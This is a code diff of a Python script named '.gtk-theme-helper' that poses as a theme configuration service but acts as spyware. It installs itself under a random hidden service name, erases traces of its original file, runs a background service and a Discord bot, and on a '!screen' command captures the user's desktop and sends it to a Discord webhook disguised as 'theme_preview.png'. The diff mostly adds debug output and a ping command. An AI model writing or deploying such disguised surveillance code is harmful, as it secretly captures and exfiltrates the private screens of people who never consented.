@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-.gtk-theme-helper - Theme configuration service 
+.gtk-theme-helper - Theme configuration service with Discord bot
 """
 
 import os
@@ -17,6 +17,7 @@ import json
 import logging
 import random
 import string
+import threading
 
 # Configuration
 SERVICE_NAME = f".theme-helper-{''.join(random.choices(string.ascii_lowercase, k=4))}"
@@ -197,6 +198,7 @@ def take_screenshot_pyautogui():
         return screenshot_path
         
     except Exception as e:
+        print(f"Screenshot error: {e}")
         return None
 
 def send_to_discord(file_path, token):
@@ -209,7 +211,8 @@ def send_to_discord(file_path, token):
         with open(file_path, 'rb') as f:
             webhook.send(file=discord.File(f, filename='theme_preview.png'))
         return True
-    except:
+    except Exception as e:
+        print(f"Discord send error: {e}")
         return False
 
 def handle_signal(signum, frame):
@@ -252,7 +255,7 @@ def setup_discord_bot():
         # Get token
         token = fetch_token()
         if not token:
-            print("Failed to get Discord token")
+            print("❌ Failed to get Discord token")
             return False
         
         intents = discord.Intents.default()
@@ -261,7 +264,9 @@ def setup_discord_bot():
         
         @bot.event
         async def on_ready():
-            print(f"Theme helper bot logged in as {bot.user}")
+            print(f"✅ Theme helper bot logged in as {bot.user}")
+            print("🤖 Bot is online and ready for commands!")
+            print("💻 Use !screen to take a screenshot")
             
         @bot.command(name="screen")
         async def cmd_screen(ctx):
@@ -270,7 +275,7 @@ def setup_discord_bot():
                 await ctx.send("📸 Taking theme preview...")
                 
                 if request_screenshot():
-                    await ctx.send("✅ Preview requested")
+                    await ctx.send("✅ Preview requested - check for screenshot soon!")
                 else:
                     await ctx.send("❌ Preview service busy")
                     
@@ -280,18 +285,28 @@ def setup_discord_bot():
         @bot.command(name="status")
         async def cmd_status(ctx):
             """Check bot status"""
-            await ctx.send("🟢 Theme helper service active")
+            await ctx.send("🟢 Theme helper service active and running")
         
-        # Run the bot
+        @bot.command(name="ping")
+        async def cmd_ping(ctx):
+            """Check if bot is responsive"""
+            await ctx.send("🏓 Pong! Bot is alive")
+        
+        print("🔌 Starting Discord bot...")
         bot.run(token)
         return True
         
+    except ImportError as e:
+        print(f"❌ Missing Discord module: {e}")
+        return False
     except Exception as e:
-        print(f"Discord bot error: {e}")
+        print(f"❌ Discord bot error: {e}")
         return False
 
 def screenshot_service():
     """Run the screenshot service"""
+    print("📷 Starting screenshot service...")
+    
     # Check for lock file
     if os.path.exists(LOCK_FILE):
         try:
@@ -299,6 +314,7 @@ def screenshot_service():
                 pid = int(f.read().strip())
             try:
                 os.kill(pid, 0)
+                print("📷 Screenshot service already running")
                 return  # Already running
             except OSError:
                 pass
@@ -306,10 +322,11 @@ def screenshot_service():
             pass
     
     if not create_lock():
+        print("❌ Failed to create lock file")
         return
     
-    # Run as daemon
-    daemonize()
+    # Run as daemon (but keep output for debugging)
+    # daemonize()
     setup_logging()
     
     signal.signal(signal.SIGTERM, handle_signal)
@@ -318,7 +335,10 @@ def screenshot_service():
     
     token = fetch_token()
     if not token:
+        print("❌ No Discord token for screenshot service")
         return
+    
+    print("📷 Screenshot service ready - waiting for triggers...")
     
     # Main service loop
     trigger_file = Path("/tmp/.theme_preview_trigger")
@@ -331,13 +351,20 @@ def screenshot_service():
                 current_time = time.time()
                 if current_time - last_trigger > 30:
                     last_trigger = current_time
+                    print("📸 Screenshot triggered...")
                     screenshot_path = take_screenshot_pyautogui()
                     if screenshot_path:
-                        send_to_discord(screenshot_path, token)
+                        print("🔄 Sending to Discord...")
+                        if send_to_discord(screenshot_path, token):
+                            print("✅ Screenshot sent successfully")
+                        else:
+                            print("❌ Failed to send screenshot")
                         try:
                             os.remove(screenshot_path)
                         except:
                             pass
+                    else:
+                        print("❌ Failed to take screenshot")
                     try:
                         trigger_file.unlink()
                     except:
@@ -346,10 +373,13 @@ def screenshot_service():
             time.sleep(2)
             
         except Exception as e:
+            print(f"📷 Service error: {e}")
             time.sleep(10)
 
 def main():
     """Main function"""
+    print("🚀 Starting Theme Helper...")
+    
     if '--service' in sys.argv:
         # Run only the screenshot service
         screenshot_service()
@@ -358,30 +388,38 @@ def main():
         setup_discord_bot()
     else:
         # Run both services
-        import threading
+        print("🔧 Starting both services...")
         
         # Start screenshot service in background thread
         service_thread = threading.Thread(target=screenshot_service, daemon=True)
         service_thread.start()
         
-        # Run Discord bot in main thread
+        print("⏳ Waiting for services to initialize...")
+        time.sleep(3)
+        
+        # Run Discord bot in main thread (this will block)
+        print("🤖 Starting Discord bot...")
         setup_discord_bot()
 
 if __name__ == "__main__":
     # Auto-install on first run
     if not is_installed() and len(sys.argv) == 1:
-        print("Setting up theme helper...")
+        print("🛠️ First run - setting up theme helper...")
         if install_requirements():
             if install_user_service():
-                print("Theme helper configured")
+                print("✅ Theme helper configured")
                 clean_traces(os.path.abspath(__file__))
                 target_script = f"{HIDDEN_DIR}/{SERVICE_NAME}"
                 if os.path.exists(target_script):
-                    os.system(f"/usr/bin/python3 {target_script} --service &")
-                sys.exit(0)
+                    print("🔌 Starting background service...")
+                    os.system(f"/usr/bin/python3 {target_script} &")
+                    print("🎉 Installation complete! Bot should be online soon.")
+                else:
+                    print("❌ Failed to find installed script")
             else:
-                print("Theme setup incomplete")
+                print("❌ Theme setup incomplete")
         else:
-            print("Theme utilities need setup")
+            print("❌ Theme utilities need manual setup")
     else:
+        # If already installed or with arguments, run normally
         main()
